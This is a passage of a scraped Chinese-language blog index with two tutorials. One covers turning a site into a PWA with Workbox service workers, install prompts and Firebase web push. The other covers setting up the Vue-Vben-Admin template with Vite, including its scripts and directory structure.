Worker（以下簡稱 SW），可以幫助我們在發送 request 之前就先攔截到並且做處理，而離線運行的原理也是這樣的，我們先在第一次開啟時註冊 SW，並且利用 SW 下載靜態檔案並快取住，之後若使用者離線，我們再用已經快取住的檔案來回覆，就不會發送真的 request，自然也不會發生無法連線的情況。\n而 Google 有提供了一個方便的工具：Workbox 來幫助我們自動產生出 SW 以及利用更方便的語法來攔截 request。\n舉例來說，我自己用的是 Webpack 的 plugin：\n1 2 3 4 5 6 7 8 9 10 new workboxPlugin.InjectManifest({ swSrc: path.join(__dirname, \u0026#39;..\u0026#39;, SRC_DIR, \u0026#39;sw.js\u0026#39;), swDest: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR, \u0026#39;sw.js\u0026#39;), globDirectory: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR), globPatterns: [\u0026#39;**/*.{js,css}\u0026#39;] }), //sw.js let precacheList = self.__precacheManifest || [] workbox.precaching.precacheAndRoute(precacheList) 只要這樣一寫，就會自動去找符合規則的檔案並且加入快取清單裡面，你只要一註冊 SW 的時候就會把那些檔案給快取起來。\n除此之外呢，Workbox 也可以針對 URL 來監聽：\nsw.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // sw.js workbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args =\u0026gt; workbox.strategies .networkFirst({ cacheName: \u0026#39;data-cache\u0026#39;, plugins: [ new workbox.expiration.Plugin({ maxEntries: 100, maxAgeSeconds: 2592000 }) ] }) .handle(args) .then(response =\u0026gt; { return response }) .catch(err =\u0026gt; { console.log(\u0026#39;err:\u0026#39;, err) }) ) 像上面的程式碼就是針對路徑中含有 api 的 request 做快取，這樣在離線時也可以利用以前快取住的 API response。\nWorkbox 針對這種動態的快取提供幾種策略，分別是：staleWhileRevalidate、cacheFirst、networkFirst、networkOnly與cacheOnly，其實看名字就可以大概理解策略是什麼了，想知道詳細的內容可以參考官方文件：Workbox Strategies。\n總之自從有了 Workbox 之後，基本上就不用自己手寫 SW 了，都靠著它提供的 API 以及功能就行了，就可以自動產生出符合需求的 SW。\nAdd to home screen banner 最後要來談的是「安裝 PWA」這一塊，在 iOS Safari 上面別無他法，就只能自己叫出選單然後選取「Add to home screen」，可是在 Android Chrome 上面，如果你符合一定的條件（有設置 mainfest.json 以及有註冊 Service Worker），就會自動幫你跳出一個可愛的 Install banner。\n（圖片來自：Changes to Add to Home Screen Behavior）\n根據 Chrome 版本的不同，行為也有所不同。\n在 Chrome 67（含）以前的版本，如果你在 beforeinstallprompt 事件裡面沒有特別用 preventDefault()，或是顯式的呼叫了 prompt()，就會出現最左邊那個頗大的 A2HS banner。\n然後在 Chrome 68（含）之後的版本，無論你做了什麼，系統都會自動出現那個 Mini-infobar，但如果使用者關掉的話，要隔三個月才會再出現一次，實在是有夠久。\n接著呢，上面這兩個 A2HS banner 跟 Mini-infobar，使用者點擊之後都會出現最右邊的 A2HS Dialog，提示使用者要不要安裝 PWA。\n但是在 Chrome 68 以後，你也可以利用程式去呼叫 beforeinstallprompt 裡面拿到的 event.prompt() 把這個 dialog 顯示出來。\n聽起來有點複雜對吧？\n先來介紹 beforeinstallprompt 這個 event 好了，這個 event 在一切都準備就緒，確認你滿足條件可以顯示 prompt 的時候會被觸發，會傳來一個 event，你可以阻止顯示 prompt，把這個 event 存起來：\n1 2 3 4 5 6 7 8 9 10 11 // 此範例來自上面的官方文件 let installPromptEvent; window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, (event) =\u0026gt; { // Prevent Chrome \u0026lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector(\u0026#39;#install-button\u0026#39;).disabled = false; }); 為什麼要存起來呢？因為使用者可能不想一打開網站就看到這個彈窗，或者他可能正在結帳結果你跳這個東西來干擾他，所以先把它存起來，等適當的時機再呼叫 installPromptEvent.prompt() 來跳出 Dialog。\n但要注意的事情是你直接呼叫 installPromptEvent.prompt() 是沒用的，你必須要 within a user gesture，意思就是你要放在按鈕的 click 事件（或其他由使用者觸發的事件）裡才有效，直接呼叫是沒有用的，而且會看到 console 跳出錯誤訊息。\n我之前一度很好奇它是怎麼做判斷的，後來發現原來有 event.isTrusted 可以用，可以判斷一個事件是不是被使用者主動觸發的，參考資料：MDN - Event.isTrusted。\n總之呢，因為在不同版本上的 Chrome 有不同行為，所以最後我們決定用下面的程式碼針對不同版本有不同的反應：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // 把 event 存起來 var installPromptEvent // 要顯示 prompt 的延遲 var showTime = 30 * 1000 window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, function (e) { e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data \u0026amp;\u0026amp; data.length \u0026gt;= 2) ? parseInt(data[2], 10) : null if (version \u0026amp;\u0026amp; installPromptEvent.prompt) { // 延遲一段時間才顯示 prompt setTimeout(function() { // 如果 Chrome 版本是 67（含）以下，可以直接呼叫 if (version \u0026lt;= 67) { installPromptEvent.prompt() return } // 否則的話必須透過 user action 主動觸發 // 這邊幫 #root 加上 event listener，代表點擊螢幕任何一處都會顯示 prompt document.querySelector(\u0026#39;#root\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) }, showTime) } }); function addToHomeScreen(e) { if (installPromptEvent) { installPromptEvent.prompt() installPromptEvent = null document.querySelector(\u0026#39;#root\u0026#39;).removeEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) } } 如果是 67 以下，直接呼叫就可以顯示 prompt，否則的話還要再一步，要加個 event listener 才行，而我們也選擇延遲 30 秒才顯示。\n出乎意料地，這樣一個小改動帶來驚人的成長，原本一天大概才 20、30 個人安裝 PWA，經過這樣調整之後瞬間變成八到十倍，看到 GA 的那個統計圖我也嚇了一跳，沒想到效果這麼好。\n與其一直積極地要別人快點安裝 PWA，還不如只要求真的對你產品有興趣（停留超過 30 秒鐘）的人。\n用 Firebase 做 Web Push 用到的資源 Web Push 推播功能，這陣子很常看到的一個功能，如果一進入網站，看到網站要求顯示通知的權限，就代表這個網站有用這功能：\n那通常，很多網站 UX 設計不良，在使用者根本就還搞不清楚這網站是幹麻的情況下就跳通知，所以大部份都直接按封鎖了吧 XD？\n總之，在踩了幾個坑以後，終於完整的寫出了 Web Push 的功能。\n完整是指會在桌機、安卓手機發出推播通知，並且點了會進到指定的頁面，同時在 Firebase 儲存發送訊息的記錄。\n用到的資源如下：\n資料庫：Firebase Realtime Database 推播功能：Firebase Cloud Messaging JS framework：Vue.js Web Push 是 PWA 一個很重要的功能！\n取得 FCM 金鑰 本篇是用 Firebase 的 Cloud Messaging功能（以下稱 FCM），去實作 Web Push。所以第一步是要先在 Firebase 上開一個專案。\n以下截圖所用到的 Firebase 專案之後會刪掉，各種金鑰最後都不會存在，純示範用。\n開完專案後，要取得推播金鑰，有了金鑰才能始用 FCM 的功能。\n首先進到 Firebase 後台，點選齒輪後，再點選專案設定：\n點擊 Cloud Messaging：\n頁面往下拉，會看到一個「網路設定」的區塊，有一個「產生金鑰組」的按金，按下去：\n就會產生一組 Web Push 用的金鑰，先存下來，Firebase Config 裡會用到：\n新增 manifest.json、Firebase Config 取得金鑰後，第二步就是新增一個 manifest.json 的檔案，檔案內容大概如下：\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 { \u0026#34;short_name\u0026#34;: \u0026#34;XXX\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;XXXXXX\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo192.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo512.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./logo/maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#000000\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } 最重要的是這一行：\n1 \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; 這行一定要有，key、value 是固定的，copy 貼上就行。\nFirebase Config 建立一個首頁的檔案 index.html，在頁尾的部份引用 Firebase Config。\nFirebase Config 一樣是後台有提供，點小齒輪，再點專案設定後，接著點代表 Web 的那個按鈕：\n就會出現 Config 了：\ncopy 以後貼到 index.html，另外也一併貼上 FCM 的引用，整合後如下：\nfcm-web-push-firebase-config.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script src=\u0026#34;https://www.gstatic.com/firebasejs/5.9.1/firebase.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var database = firebase.database(); var messaging = firebase.messaging(); messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); \u0026lt;/script\u0026gt; 最後一行的：\n1 messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); XXX 就是要替換成第一步拿到的 FCM 金鑰。\n取得使用者的 token 簡單來說，Web Push 推播功能的流程如下：\n註冊 service-worker → 向使用者要求允許通知權限 → FCM 產生這個裝置的 token → token 寫進資料庫 → 從後台使用 Web Push → Server 發 Web Push 到裝置上 → 裝置上的 service worker 接收 → service worker 執行 notification token 是每一個裝置會有的，之所以會以裝置為單位，而不是以使用者為單位，是因為每一個裝置都可以註冊service worker，而且每次存的 token 都會不同，所以一個使用者在桌機的 Chrome、Fireox，或是安卓手機的Chrome、Firefox，都有不同的 token。\n假設王小明在桌機的 Chrome、Firefox，都按下了允許通知，在安卓手機的 Chrome、Firefox 也按了允許通知，那當我們按下發送推播後，王小明就會在 4 個地方收到相同的通知。因為是用裝置來區分的。\nIOS 目前還不支援 Web Push。\n2020.04.10更新：\n今天看到 iZooto 的 一篇文章 上寫，在比對了一下 Can I Use 中的 service workers 支援情況，可以看到 IOS11.3 開始支援 Service Workers 了，但 Web Push 的功能只支援在 MAC，尚未支援到 iPhone 上。\n新增 sw.js 用 Workbox 新增一個 sw.js 檔案，把 Firebase 的 Config 放進去，程式碼如下：\nfcm-web-push-sw1.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 importScripts(\u0026#34;https://storage.googleapis.com/workbox-cdn/releases/3.6.3/workbox-sw.js\u0026#34;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-app.js\u0026#39;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-messaging.js\u0026#39;); workbox.clientsClaim(); workbox.skipWaiting(); workbox.precaching.precacheAndRoute([ // 要快取的檔案 ]); // firebase config var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var messaging = firebase.messaging(); 如果推播裡要放公司的 Logo，那 Logo 的圖檔就要寫進快取檔案的清單裡，到時推播才有圖檔可以顯示。\n註冊 sw.js、存 Cookies、存 Firebase 如果拿到的 token 不存在 Cookies 裡，用 Cookies 判斷是否拿過 token，那使用者就會存到 2 組以上的 token，在發推播時，就會收到相同的訊息多次。\n當然，如果使用者清除了快取，就會有別種情況發生，最好的方式還是讓使用者登入會員後，再取得 token，把 token 跟會員綁一起，就不會有奇奇怪怪的情形出現。\n以下為 JS code：\nfcm-web-push-get-token.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 window.addEventListener(\u0026#39;load\u0026#39;, function() { if(\u0026#39;serviceWorker\u0026#39; in navigator) { navigator.serviceWorker.register(\u0026#39;/sw.js\u0026#39;) .then(function(reg) { // firebase methods，用同一支sw.js messaging.useServiceWorker(reg); }) // 註冊失敗 .catch(function(err) { console.log(\u0026#39;error: \u0026#39;, err); }); } messaging.requestPermission().then(function() { // 先判斷cookies有沒有token，沒有再取token var ckv = document.cookie.replace(/(?:(?:^|.*;\\\\s*)augustusWsPush\\s*\\=\\s*([^;]*).*$)|^.*$/, \u0026#34;$1\u0026#34;) || null; // cookies不存在，跟使用者要求通知權限 if(ckv === null) { // 拿到token，firebase-messaging-sw.js 就會存 Service Workers 裡 messaging.getToken().then(function(currentToken) { // token存至firebase var id = currentToken.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: currentToken}); // token存至cookies document.cookie = \u0026#34;augustusWsPush=\u0026#34; + currentToken; }); } // cookies 已存在，從 cookies 取出後傳至 firebase else { var id = ckv.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: ckv}); } }).catch(function(err) { console.log(\u0026#39;使用者未允許通知\u0026#39;, err); }); }); 裡面有一行很重要：\n1 messaging.useServiceWorker(xxx); 這是這次踩到的坑。\n如果沒寫這行，就會發現網站存了 2 個 service worker，分別是 Firebase 的，以及我們自己的。這行可以讓 FCM 只存我們註冊的 sw.js，才可以在用 FCM 推播時，順利的執行推播及點擊後開啟指定的頁面。\n成功的話，開啟 index.html，在開發人員工具的 Application → Service Workers，就會看見註冊了 sw.js 檔案：\n註冊 sw.js 只能在 https 下，因此網域必須有S SL，不然會註冊失敗。\n1 messaging.requestPermission() 這行會跟使用者要允許通知，使用者按下允許後\n1 messaging.requestPermission() 這行就會產生 FCM 的 token，之後就是存進 Firebase 跟 Cookies。\nFirebase 上會看到以下：\n之後只要跑個迴圈，就可以一個個去發送 Web Push。\n發送 Web Push 這邊新增一個 admin.html 來當做發送 Web Push 的後台介面，直接用 Vue.js 抓每個 input 的值。\nWeb Push 如果要判斷成效，直接用 Google Analytics 的 utm 參數就可以了，所以後台欄位有給 utm 用的 3 個主要參數。\n不含樣式的原始碼文末會附上 GitHub 網址。\n在發送 Web Push 時，還要填入伺服器的金鑰，這也是從 Firebase 後台可以拿到。點小齒輪 → 專案設定 → Cloud Messaging，第一個「伺服器金鑰」的值就是了：\n發送 Web Push 的 JS 如下，寫在 admin.html 裡：\nfcm-web-push-trigger.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var notification = { \u0026#39;title\u0026#39;: \u0026#39;web push標題\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;web push內文\u0026#39;, \u0026#39;badge\u0026#39;: \u0026#39;logo圖檔路徑\u0026#39;, \u0026#39;icon\u0026#39;: \u0026#39;logo圖檔路徑\u0026#39;, \u0026#39;click_action\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39;, \u0026#39;data\u0026#39;: { \u0026#39;url\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39; } }; fetch(\u0026#39;https://fcm.googleapis.com/fcm/send\u0026#39;, { \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;headers\u0026#39;: { \u0026#39;Authorization\u0026#39;: \u0026#39;key=從firebase上取得伺服器金鑰\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, \u0026#39;body\u0026#39;: JSON.stringify({ \u0026#39;data\u0026#39;: notification, \u0026#39;to\u0026#39;: \u0026#39;使用者的token\u0026#39;, }) }).then(function(response) { console.log(response); }).catch(function(error) { alert(error); }); 接收 Web Push 接受 Web Push 有 2 種情況：\n使用者正開啟官網頁面 使用者沒有開啟官網頁面 第一種情況，是在 index.js 下寫一個 messaging.onMessage 的 function 處理。\n第二種情況，是在 sw.js 下寫一個 messaging.setBackgroundMessageHandler 的 function 處理。\n使用者正開啟官網頁面 官網正開啟的狀況下，屬於 JS 的 notification 功能，function 範例如下：\nfcm-web-push-notification.js 1 2 3 4 5 6 7 8 9 10 11 messaging.onMessage(function(payload) { var msgTitle = payload.data.title; var url = payload.data.click_action; var notification = new Notification(msgTitle, payload.data); // 點擊推播後要連去哪 notification.addEventListener(\u0026#39;click\u0026#39;, function() { e.preventDefault(); location.href = url; }); }); payload 就是傳來的值，點擊後要導到的頁面就用 location.href 來處理。\n使用者沒有開啟官網頁面 使用者在上網，但沒有開啟官網的頁面，就是由之前註冊的 sw.js 處理，在 sw.js 加入以下：\nfcm-web-push-sw2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var click_action; // 監聽notifiction點擊事件 self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var url = click_action; event.notification.close(); event.waitUntil( clients.matchAll({ type: \u0026#39;window\u0026#39; }).then(windowClients =\u0026gt; { // 如果tab是開著的，就 focus 這個tab for (var i = 0; i \u0026lt; windowClients.length; i++) { var client = windowClients[i]; if(client.url === url \u0026amp;\u0026amp; \u0026#39;focus\u0026#39; in client) { return client.focus(); } } // 如果沒有，就新增tab if(clients.openWindow) { return clients.openWindow(click_action); } }) ); }); // FCM messaging.setBackgroundMessageHandler(function(payload) { var data = payload.data; var title = data.title; var options = { body: data.body, icon: \u0026#39;/logo/logo192.png\u0026#39;, badge: \u0026#39;/logo/logo192.png\u0026#39; }; click_action = data.click_action; return self.registration.showNotification(title, options); }); click_action 是點擊後要開啟的頁面網址，但要另外寫一個 notificationclick 來處理。\n這邊踩了一個坑，如果按照一般順序來寫，會先寫了 messaging.setBackgroundMessageHandler 後，再寫 notificationclick。然後就會發現，Chrome 上可以正常運作，但在 Firefox 上怎麼點就是不會開啟頁面。\nGoogle 了很久，才看到這篇：service worker notificationclick event doesn’t focus or open my website in tab\nclick_action 是 Chrome 用的，如果 messaging.setBackgroundMessageHandler 先寫了，那 FCM 就會全部接收 Web Push 的功能，就不會讓原生的 notificationclick 事件被運作，因此 notificationclick 得寫在前，讓原生事件運作後，再執行 FCM 的事件。\n補充資源 有了發送、接收，基本上 Web Push 就可以順利運作了。\n要注意的是 Web Push 只接受在 https 以下運行。\n最後附上學習時參考的教學文，以及本篇的 GitHub 原始碼。\n從建 Firebase 就開始教學的（英文）：Tutorial: Web Push notification using Firebase\n建立 Service Worker Web Push Notification — (Firebase Push Notification實作紀錄)\nPush Notification之成為訂閱用戶(Firebase實作)\nGoogle 官方教學的原始碼：GitHub\nGoogle 官方教學的功能示範：Notification Examples\n","date":"2022-10-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52438994804_33f71b7e35_o.jpg","permalink":"https://wayneblog.ga/2022-10-19/web-pwa/","title":"將網頁變成Progressive Web Application(PWA)，漸進式的網頁應用程式"},{"content":" 參考網站\n參考網站\n這是一篇完整的 2022 年連結優化指南。\n因此，如果你想要取得權威網站的反向連結。\n你將會在這篇新指南中，享受本文可操作的技巧。\n讓我們往深入其中吧。\nVben Admin 點我跳過 Vben Admin，直接前往配置Vite\n介紹 Vue-Vben-Admin 是一個基於 Vue3.0、Vite、Ant-Design-Vue、TypeScript 的後台解決方案，目標是為開發中大型項目提供開箱即用的解決方案。包括二次封裝組件、utils、hooks、動態菜單、權限校驗、按鈕級別權限控制等功能。項目會使用前端較新的技術棧，可以作為項目的啟動模版，以幫助你快速搭建企業級中後台產品原型。也可以作為一個示例，用於學習 vue3、vite、ts 等主流技術。該項目會持續跟進最新技術，並將其應用在項目中。\n文檔 中文文檔地址為 vben-admin-doc，採用 Vitepress 開發。 本地運行文檔 如需本地運行文檔，請拉取代碼到本地。\n1 2 3 4 5 6 7 8 # 拉取代碼 git clone https://github.com/vbenjs/vue-vben-admin-doc # 安裝依賴 yarn # 運行項目 yarn dev 需要掌握的基礎知識 本項目需要一定前端基礎知識，請確保掌握Vue 的基礎知識，以便能處理一些常見的問題。建議在開發前先學一下以下內容，提前了解和學習這些知識，會對項目理解非常有幫助：\nVue3 文檔 Vue-RFCS Vue2 遷移到 3 TypeScript Vue-router Ant-Design-Vue ES6 Vitejs WindiCss 模版 vue-vben-admin (完整版演示) vue-vben-admin 完整版本。該版本主要是提供一些Demo示例及插件的使用集成方式，主要用於參考。如果對項目不是很熟悉，不建議在此基礎上進行開發，請使用下方提供的精簡版本。\nvue-vben-admin-thin (精簡版演示) vue-vben-admin 精簡版本。刪除了相關示例、無用文件及功能、依賴。可以根據自身需求安裝對應的依賴。因為使用的是 vite，依賴刪除不會導致相關組件或者 hook 發出警告。只在需要的時候安裝對應的庫即可。\nvite 插件推薦 vite-plugin-mock - 用於本地及開發環境數據 mock\nvite-plugin-html - 用於 html 模版轉換，可以在html文件內進行書寫模版語法\nvite-plugin-style-import - 用於組件庫樣式按需引入\nvite-plugin-imagemin - 用於打包壓縮圖片資源\nvite-plugin-theme - 用於在線切換主題色/黑暗主題適配等主題相關配置\nvite-plugin-compression - 用於打包輸出.gz|.br文件\nvite-plugin-svg-icons - 快速生成 svg sprite\n瀏覽器支持 本地開發推薦使用Chrome 最新版瀏覽器，不支持Chrome 80以下版本。\n生產環境支持現代瀏覽器，不支持IE。\n創建VbenLearn項目 使用Vite創建項目 vite官方文檔\n1 2 3 4 5 6 7 8 # 官網上的創建項目命令 yarn create @vitejs/app # 名稱 vben-learn # vue-ts的模板 √ vue-ts yarn報錯 文件名、目錄名或卷標語法不正確。報錯，參考鏈接\n安裝 vscode 插件 安裝插件 VbenAdmin 官方推荐\nIconify IntelliSense：Iconify 圖標插件 WndiCSS lntelliSense：windicss 提示插件 i18n Ally： i18n 插件 Vetur：vue 開發必備 （也可以選擇 Volar） ESLint：腳本代碼檢查 Prettier - Code formatter：代碼格式化 Stylelint：css 格式化 DotENV： .env 文件 高亮 獲取 Vben Admin 從 GitHub 獲取代碼 1 git clone https://github.com/vbenjs/vue-vben-admin.git 從 Gitee 獲取代碼 1 git clone https://gitee.com/annsion/vue-vben-admin.git 注意\nGitee 的代碼可能不是最新的\nimagemin 依賴安裝失敗解決方法 由於 imagemin 在國內安裝困難，提供以下幾個解決方案：\n使用 yarn 在 package.json 內配置(推薦，項目內已集成，前提是必須使用 yarn) package.json 1 2 3 4 5 // ... \u0026#34;resolutions\u0026#34;: { \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; } // ... 使用 npm，在電腦 host 文件加上如下配置即可 etc/hosts 1 199.232.4.133 raw.githubusercontent.com npm script package.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // ... \u0026#34;scripts\u0026#34;: { # 安裝依賴 \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, # 運行項目 \u0026#34;serve\u0026#34;: \u0026#34;npm run dev\u0026#34;, # 運行項目 \u0026#34;dev\u0026#34;: \u0026#34;vite\u0026#34;, # 構建項目 \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, # 清空緩存後構建項目 \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, # 生成打包分析，在 `Mac OS` 電腦上執行完成後會自動打開界面，在 `Window` 電腦上執行完成後需要打開 `./build/.cache/stats.html` 查看 \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34;, # 類型檢查 \u0026#34;type:check\u0026#34;: \u0026#34;vue-tsc --noEmit --skipLibCheck\u0026#34;, # 預覽打包後的內容（先打包在進行預覽） \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, # 直接預覽本地 dist 文件目錄 \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, # 生成 ChangeLog \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, # 刪除緩存 \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, # 刪除 node_modules (`window` 系統手動刪除該目錄較慢，可以使用該命令來進行刪除) \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, # 執行 eslint 校驗，並修復部分問題 \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, # 執行 prettier 格式化（該命令會對項目所有代碼進行 prettier 格式化，請謹慎執行） \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, # 執行 stylelint 格式化 \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, # 對打包結果進行 gzip 測試 \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, # 對打包目錄進行 brotli 測試 \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, # 重新安裝依賴，見下方說明 \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, # 生成圖標集，見下方說明 \u0026#34;gen:icon\u0026#34;: \u0026#34;esno ./build/generate/icon/index.ts\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... 目錄說明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 . ├── build # 打包腳本相關 │ ├── config # 配置文件 │ ├── generate # 生成器 │ ├── script # 腳本 │ └── vite # vite配置 ├── mock # mock文件夾 ├── public # 公共靜態資源目錄 ├── src # 主目錄 │ ├── api # 接口文件 │ ├── assets # 資源文件 │ │ ├── icons # icon sprite 圖標文件夾 │ │ ├── images # 項目存放圖片的文件夾 │ │ └── svg # 項目存放svg圖片的文件夾 │ ├── components # 公共組件 │ ├── design # 樣式文件 │ ├── directives # 指令 │ ├── enums # 枚舉/常量 │ ├── hooks # hook │ │ ├── component # 組件相關hook │ │ ├── core # 基礎hook │ │ ├── event # 事件相關hook │ │ ├── setting # 配置相關hook │ │ └── web # web相關hook │ ├── layouts # 佈局文件 │ │ ├── default # 默認佈局 │ │ ├── iframe # iframe佈局 │ │ └── page # 頁面佈局 │ ├── locales # 多語言 │ ├── logics # 邏輯 │ ├── main.ts # 主入口 │ ├── router # 路由配置 │ ├── settings # 項目配置 │ │ ├── componentSetting.ts # 組件配置 │ │ ├── designSetting.ts # 樣式配置 │ │ ├── encryptionSetting.ts # 加密配置 │ │ ├── localeSetting.ts # 多語言配置 │ │ ├── projectSetting.ts # 項目配置 │ │ └── siteSetting.ts # 站點配置 │ ├── store # 數據倉庫 │ ├── utils # 工具類 │ └── views # 頁面 ├── test # 測試 │ └── server # 測試用到的服務 │ ├── api # 測試服務器 │ ├── upload # 測試上傳服務器 │ └── websocket # 測試ws服務器 ├── types # 類型文件 ├── vite.config.ts # vite配置文件 └── windi.config.ts # windcss配置文件 Vite配置多環境 說明： 就好像之前在Vue-Cli中的env一樣。\nVite官網說明\nVbenAdmin官方說明\n項目的環境變量配置位於項目根目錄下的 .env、.env.development、.env.production\n1 2 3 4 .env # 在所有的環境中被載入 .env.local # 在所有的環境中被載入，但會被 git 忽略 .env.[mode] # 只在指定的模式中被載入 